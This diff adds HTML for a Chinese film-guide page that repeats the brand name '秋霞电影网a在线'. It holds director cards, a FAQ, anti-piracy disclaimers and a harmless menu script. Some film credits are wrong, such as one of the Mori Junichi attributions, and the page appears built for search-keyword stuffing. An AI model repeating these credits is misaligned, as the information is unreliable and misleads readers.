+          <div class="top"><span class="ava2" style="background:linear-gradient(140deg,#f6b73c,#e0931f)">是</span><div><span class="src">日常 · 留白 · 海</span><h3>是枝裕和：把"没说出口"拍成一句台词</h3></div></div>
+          <p>《海街日记》的台阶、《步履不停》的庭院、《小偷家族》的雨。<b>他的固执：家人的定义，不是血缘，是选择。</b></p>
+          <div class="films"><a href="#">海街日记</a><a href="#">步履不停</a><a href="#">小偷家族</a><a href="#">如父如子</a></div>
+        </article>
+        <article class="node">
+          <div class="top"><span class="ava2" style="background:linear-gradient(140deg,#e8654f,#a83c27)">黑</span><div><span class="src">雨 · 尊严 · 沉默</span><h3>黑泽明：把"人的尊严"拍成一场雨</h3></div></div>
+          <p>《七武士》的泥、《罗生门》的树、《生之欲》的秋千。<b>他的固执：再绝望的处境，也要留下一个站得住的人。</b></p>
+          <div class="films"><a href="#">七武士</a><a href="#">罗生门</a><a href="#">生之欲</a><a href="#">影武者</a></div>
+        </article>
+        <article class="node">
+          <div class="top"><span class="ava2" style="background:linear-gradient(140deg,#c2446f,#8d2f56)">森</span><div><span class="src">青春 · 铁道 · 离别</span><h3>森淳一：把"再见"拍成一道光</h3></div></div>
+          <p>《乘火车去远方》的站台、《小森林》的灶台、《哪啊哪啊神去村》的树。<b>他的固执：成长，就是把"不想走"走成"我会回来"。</b></p>
+          <div class="films"><a href="#">乘火车去远方</a><a href="#">小森林</a><a href="#">哪啊哪啊神去村</a></div>
+        </article>
+        <article class="node">
+          <div class="top"><span class="ava2" style="background:linear-gradient(140deg,#6b3a6e,#43224a)">宫</span><div><span class="src">风 · 水 · 少女</span><h3>宫崎骏：把"飞翔"拍成一种信仰</h3></div></div>
+          <p>《千与千寻》的风、《天空之城》的云、《龙猫》的树。<b>他的固执：孩子看得懂的，才是最深的。</b></p>
+          <div class="films"><a href="#">千与千寻</a><a href="#">天空之城</a><a href="#">龙猫</a><a href="#">幽灵公主</a></div>
+        </article>
+        <article class="node">
+          <div class="top"><span class="ava2" style="background:linear-gradient(140deg,#3f6f8f,#26475c)">诺</span><div><span class="src">时间 · 物理 · 胶片</span><h3>克里斯托弗·诺兰：把"时间"拍成主角</h3></div></div>
+          <p>《星际穿越》的黑洞、《盗梦空间》的折叠、《奥本海默》的沉默。<b>他的固执：能实拍就不特效，能胶片就不数字。</b></p>
+          <div class="films"><a href="#">星际穿越</a><a href="#">盗梦空间</a><a href="#">奥本海默</a><a href="#">信条</a></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目五：在线问答（手风琴 details）=================== -->
+  <section id="night" aria-labelledby="h-n5" class="night">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">AUTUMN · 03</div>
+          <h2 class="sec-title" id="h-n5">在线问答 · 一句话说清"到底值不值得看"</h2>
+          <p class="sec-sub">不用写长评。用一句话回答："这部影视，到底值不值得交出 160 分钟？"</p>
+        </div>
+        <a class="more" href="#">全部问答 →</a>
+      </div>
+
+      <details class="acc" open>
+        <summary><span class="no">Q1</span><h3>"秋霞电影网a在线"的"a"和"在线"，是什么意思？</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>"a"是语气，是"啊"——一种轻叹；"在线"是状态——随时可以开始。</b>合起来就是：<b>秋霞电影网a在线，是一个随时可以打开、按心情挑片的影视观看指引。</b>本站同时覆盖<b>电影、剧集、纪录片、动画</b>：片长不是门槛，<b>① 讲清楚了什么 ② 有没有一个"值得放大看"的镜头 ③ 看完会不会想重看</b>，才是入选标准。
+          <div class="tags"><a href="#">选片</a><a href="#">不剧透</a><a href="#">电影</a><a href="#">剧集</a><a href="#">纪录片</a><a href="#">动画</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">Q2</span><h3>片单里的分数，是什么分？</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>是"值得放大看指数"，不是评分排名。</b>综合<b>豆瓣 / IMDb / 烂番茄</b> 三项加权后，再扣掉"说教感""矫情度""拖沓度"。<b>90 分以上：必看，值得二刷；80 分以上：值得一看；80 分以下：不进片单。</b>
+          <div class="tags"><a href="#">评分</a><a href="#">加权</a><a href="#">电影</a><a href="#">剧集</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">Q3</span><h3>秋霞电影网a在线，会不会剧透？</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>只讲"设定"，不讲"结局"。</b>我们说清三件事：<b>① 它是讲什么的（一句话）② 它硬在哪（一个镜头 / 一句台词 / 一束光）③ 它适合谁（一种心境）</b>。反转、凶手、真相，一律不提。
+          <div class="tags"><a href="#">不剧透</a><a href="#">设定</a><a href="#">适合谁</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">Q4</span><h3>在哪里才能看到"高清正版"的版本？</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>请通过合法渠道观看。</b>认准<b>电影院、持证视频平台、正版蓝光碟、官方流媒体</b>；<u>本站不提供、不链接、不引导任何影片下载或盗版在线播放</u>。秋霞的颜色，只有在正版的高画质里才成立——盗版只会糊成一团。
+          <div class="tags"><a href="#">正版观影</a><a href="#">拒绝盗版</a><a href="#">支持创作者</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">Q5</span><h3>为什么叫"秋霞"？</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>因为最好的电影，都像一场秋日晚霞：</b>不喧哗，不催促，看完心里暖一阵、静一阵，然后该睡就睡，该起就起。<b>"秋霞"取秋日晚霞意象，喻"此刻的心情"；不含、不指向、不暗示任何低俗、违法或成人敏感含义。</b>
+          <div class="tags"><a href="#">品牌</a><a href="#">心情</a><a href="#">不低俗</a></div>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目六：关于本站（双栏 + 数据卡 + 进度条）=================== -->
+  <section id="about" aria-labelledby="h-ab6" class="about">
+    <div class="container ab-grid">
+      <div>
+        <div class="eyebrow">ABOUT · 秋霞电影网a在线</div>
+        <h2 id="h-ab6">秋霞电影网a在线，<br><em>只推荐值得放大看的</em></h2>
+        <p><b>秋霞电影网a在线</b>是一个<b>影视推荐与观影指南</b>类内容站点。我们不生产资源、不搬运剧情，只做一件事：<b>帮你用 40 秒，挑到今晚那部"值得你交出 160 分钟、并值得投到最大屏幕"的影视作品。</b></p>
+        <div class="feat">
+          <div class="f"><div class="n">186</div><h3>精选片单</h3><p>愿意为它们再花一遍 160 分钟。</p></div>
+          <div class="f"><div class="n">9</div><h3>种秋霞心情</h3><p>先承认心情，再选片子。</p></div>
+          <div class="f"><div class="n">≥90</div><h3>值得一看</h3><p>三项评分加权，低于 80 不入选。</p></div>
+          <div class="f"><div class="n">0</div><h3>零盗版</h3><p>不提供、不链接、不引导任何下载或盗播。</p></div>
+        </div>
+      </div>
+      <div>
+        <div class="metrics">
+          <div class="metric a"><div class="top"><span>已精选 · 在线片单</span><b>186</b></div><div class="track"><i style="width:82%"></i></div></div>
+          <div class="metric l"><div class="top"><span>已整理 · 秋霞台词</span><b>312</b></div><div class="track"><i style="width:68%"></i></div></div>
+          <div class="metric o"><div class="top"><span>已归档 · 情绪图鉴</span><b>97</b></div><div class="track"><i style="width:54%"></i></div></div>
+        </div>
+        <p style="margin-top:22px;font-size:.86rem;color:var(--ink2)">⚠ <b style="color:#a83c27">合规声明：</b>①<b>"秋霞电影网a在线"为本站名称</b>，取"秋日晚霞"意象，喻"此刻的心情"，<u>不含、不指向、不暗示任何低俗、违法或成人敏感含义</u>；②本站为影视评论、推荐与观影指南类站点，与任何播放器、下载工具、资源站、成人站点<u>均无隶属或合作关系</u>；③本站<b>不提供、不链接、不引导任何影片下载或盗版在线播放</b>，涉及剧照、台词、片段均为合理引用的评论所需；④请通过电影院、持证视频平台、正版蓝光等合法渠道观看，<b>拒绝盗版，支持创作者</b>；⑤部分影片含战争、暴力、历史沉重、社会批判等内容，建议<b>成年观众观看，理性选择</b>。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ==================== 页脚 ==================== -->
+<footer class="footer" role="contentinfo">
+  <div class="container">
+    <div class="ft-grid">
+      <div class="ft-col">
+        <a class="logo" href="#top"><span class="orb" aria-hidden="true"></span><span class="tx"><b style="color:#fff">秋霞电影网a在线</b><small>AUTUMN SUNSET</small></span></a>
+        <p style="margin-top:11px;max-width:300px">秋霞电影网a在线，一份按"此刻心情"整理的影视观看指引。电影、剧集、纪录片、动画，只留会二刷的。</p>
+      </div>
+      <div class="ft-col"><h4>在线片单</h4>
+        <ul><li><a href="#picks">想被暖一下</a></li><li><a href="#mood">想被治愈</a></li><li><a href="#">想被爱一下</a></li><li><a href="#">想安静一会儿</a></li></ul>
+      </div>
+      <div class="ft-col"><h4>看片方法</h4>
+        <ul><li><a href="#talk">秋霞台词</a></li><li><a href="#knight">导演谱系</a></li><li><a href="#">镜头语言</a></li><li><a href="#">观影顺序</a></li></ul>
+      </div>
+      <div class="ft-col"><h4>关于</h4>
+        <ul><li><a href="#about">秋霞电影网a在线是什么</a></li><li><a href="#">版权与引用声明</a></li><li><a href="#">正版观影指引</a></li><li><a href="#">联系我们</a></li></ul>
+      </div>
+    </div>
+    <div class="ft-base">
+      <p>© <span id="yr"></span> 秋霞电影网a在线 · 网站网址：<a href="https://qiuxiadianyingwangazaixian-cn.github.io/">https://qiuxiadianyingwangazaixian-cn.github.io/</a> ｜ 倡导理性、正版、深度观影，拒绝盗版，支持创作者。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){
+  var open=nav.classList.toggle('show');
+  burger.setAttribute('aria-expanded',open?'true':'false');
+  burger.textContent=open?'✕':'☰';
+});
+nav.addEventListener('click',function(e){
+  if(e.target.tagName==='A'&&window.innerWidth<=760){
+    nav.classList.remove('show');burger.setAttribute('aria-expanded','false');burger.textContent='☰';
+  }
+});
+document.getElementById('yr').textContent=(new Date()).getFullYear();
+</script>
+</body>
+</html>
